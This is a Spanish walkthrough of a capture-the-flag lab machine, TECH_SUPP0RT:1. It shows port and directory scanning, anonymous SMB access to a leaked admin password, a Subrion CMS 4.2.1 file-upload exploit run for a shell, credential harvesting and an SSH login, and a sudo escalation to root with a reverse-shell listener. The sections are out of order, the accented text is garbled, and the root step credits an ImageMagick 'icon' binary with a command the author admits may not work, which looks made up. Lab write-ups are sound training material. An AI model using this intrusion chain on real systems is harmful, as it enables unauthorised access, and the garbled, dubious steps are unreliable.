---
layout: default
---

# MÃ¡quina TECH_SUPP0RT:1

## 8. ExplotaciÃ³n de Sudoers: /usr/bin/icon (ROOT)

El binario `icon` es ejecutable como root sin contraseÃ±a. Esto permite aprovecharlo para ejecutar comandos con privilegios elevados.

### 8.1. ConfirmaciÃ³n de permisos

**Comando:**

`sudo -l`

### 8.2. Referencia (GTFOBins)

`icon` pertenece a ImageMagick. Si estÃ¡ permitido por `sudoers`, se puede forzar ejecuciÃ³n de comandos.

### 8.3. Escalada a root (shell)

1. **Preparar un listener en Kali (si vas a sacar reverse shell):**
    
    `nc -lvnp 4444`
    
2. **Ejecutar como root (ejemplo de shell local):**
    
    `sudo /usr/bin/icon -help`
    
    Si el binario permite ejecutar comandos (depende de la versiÃ³n/compilaciÃ³n), prueba con una ejecuciÃ³n directa de shell desde la funcionalidad de delegaciÃ³n:
    
    - `sudo /usr/bin/icon -e 'system("/bin/bash -p");'`\
    - o bien una reverse shell adaptando tu IP/puerto.

> Nota: la sintaxis exacta puede variar. Si este paso falla, revisa la ayuda (`icon -h`, `icon -help`) y valida versiÃ³n (`icon -version`).
> 

### 8.4. VerificaciÃ³n de privilegios

**Comandos:**

- `id`
- `whoami`

### 8.5. Flag de root

Una vez como `root`, localiza la flag:

- `cd /root`
- `ls -la`
- `cat root.txt`

---

## 9. Resumen de la Ruta de Ataque

- Reconocimiento: Nmap + enumeraciÃ³n web.
- Acceso inicial: SMB (share `websvr`) + credenciales Subrion.
- RCE: File upload en Subrion CMS 4.2.1.
- Movimiento/estabilizaciÃ³n: SSH como `scamsite`.
- Escalada: `sudo` sin contraseÃ±a sobre `/usr/bin/icon`.

## 1. Fase de Reconocimiento (EnumeraciÃ³n de Puertos)

Empezamos lanzando un escaneo de puertos para ver quÃ© servicios estÃ¡n corriendo en la IP de la mÃ¡quina.

### Escaneo de Puertos (Nmap)

**Comando:**

nmap -sV -sC -p- 10.80.156.20 

![image.png](image.png)

###

### EnumeraciÃ³n de Directorios Web

Utilizamos `gobuster` para realizar fuerza bruta de directorios en el servidor web:

Bash

`gobuster dir -u http://10.80.156.20 -w /usr/share/wordlists/dirb/common.txt`

![image.png](image%201.png)

### EnumeraciÃ³n de SMB

Al detectar el puerto 445 abierto, listamos los recursos compartidos:

Bash

`smbclient -L //10.80.156.20/ -N`

> **Resultado:** Identificamos un recurso compartido llamado `websvr`.
> 

![image.png](image%202.png)

## 2. ExplotaciÃ³n de SMB

Ahora, **lo que tienes que hacer a continuaciÃ³n** es entrar en esa carpeta y ver quÃ© hay dentro. Ejecuta este comando en tu terminal:

Bash

`smbclient //10.80.156.20/websvr -N`

Una vez dentro (verÃ¡s el prompt `smb: \>`), escribe:

1. `ls` (para ver los archivos).
2. `get enter.txt` (para descargar el archivo que suele estar ahÃ­).
3. `exit` (para salir).

![image.png](image%203.png)

### AnÃ¡lisis del archivo `enter.txt`:

Al revisar el contenido con `cat enter.txt`, obtenemos pistas fundamentales para el siguiente paso:

- **Objetivos:** Se menciona que el sitio `/subrion` no funciona correctamente y debe ser editado desde el panel.
- **Credenciales de Subrion:** * **Usuario:** `admin`
    - **Password:** `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk`
    - 
    
    ![image.png](image%204.png)
    

### Descifrando la "FÃ³rmula MÃ¡gica"

La contraseÃ±a encontrada en el SMB (`7sKvntXdPEJaxazce9PXi24zaFrLiKWCk`) no es un Base64 simple. Utilizamos **CyberChef** con la funciÃ³n **Magic** para analizarla.

- **Cadena original:** `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk`
- **Proceso:** La herramienta detecta una codificaciÃ³n mÃºltiple (Base58 -> Base32 -> Base64).
- **Resultado:** `Scam2021`

![image.png](image%205.png)

### IntrusiÃ³n: Subrion Admin Panel

Con las credenciales legÃ­timas descubiertas, procedemos a explotar el panel de administraciÃ³n del CMS.

- **URL de acceso:** `http://10.80.156.20/subrion/panel/`
- **Usuario:** `admin`
- **ContraseÃ±a:** `Scam2021`

![image.png](image%206.png)

### 5. ExplotaciÃ³n: Subida de Shell y RCE (Minuto 11:00)

Una vez dentro del Dashboard de **Subrion CMS v4.2.1**, aprovechamos una vulnerabilidad conocida de subida de archivos para obtener una shell reversa.

![image.png](image%207.png)

### BÃºsqueda con Searchsploit

Utilizamos `searchsploit` para buscar vectores de ataque contra **Subrion CMS**:

Bash

`searchsploit Subrion`

**Resultados clave:**

- **Software:** Subrion CMS v4.2.1.
- **Exploit seleccionado:** `Subrion CMS 4.2.1 - Arbitrary File Upload`.
- **ID de Exploit:** `php/webapps/49876.py`.

![image.png](image%208.png)

### Paso a seguir (EjecuciÃ³n):

Ahora tienes que traerte ese script a tu carpeta actual para ejecutarlo. Sigue estos comandos en tu Kali:

1. **Copia el exploit:**Bash
    
    `searchsploit -m 49876`
    

![image.png](image%209.png)

**Ejecuta el exploit:**
Obtenemos la url del panel al cual accedimos antes 

Bash

`python3 49876.py -u http://10.80.156.20/subrion/panel/ -l admin -p Scam2021`

![image.png](image%2010.png)

### 6. Post-ExplotaciÃ³n y Movimiento Lateral

Tras obtener acceso como `www-data`, inspeccionamos los usuarios del sistema para identificar posibles objetivos de escalada.

### EnumeraciÃ³n de Usuarios

Ejecutamos `cat /etc/passwd` y localizamos al usuario objetivo:

- **Usuario:** `scamsite`
- **Home:** `/home/scamsite`
- **Shell:** `/bin/bash`

![image.png](image%2011.png)

Vemos que el archivo es leible 

![image.png](image%2012.png)

Con el comando GREP obtenemos la contrasÃ±ea 

![image.png](image%2013.png)

### 6.1. Acceso mediante SSH (EstabilizaciÃ³n Definitiva)

Debido a que la shell obtenida por el exploit de Subrion es limitada e inestable, procedemos a utilizar las credenciales encontradas (`scamsite : ImAScammerLOL!123!`) para conectar vÃ­a **SSH**. Esto nos proporciona una sesiÃ³n de terminal completa y persistente.

**Comando de conexiÃ³n:**

Bash

`ssh scamsite@10.80.156.20`

### RecolecciÃ³n de la Flag de Usuario

Una vez dentro del sistema como `scamsite`, localizamos la primera flag en el directorio personal del usuario:

![image.png](image%2014.png)

### 7. Escalada de Privilegios: De scamsite a ROOT

### Vulnerabilidad de Sudoers

Al ejecutar `sudo -l`, identificamos una configuraciÃ³n permisiva en el archivo sudoers:
`(ALL) NOPASSWD: /usr/bin/icon`

![image.png](image%2015.png)
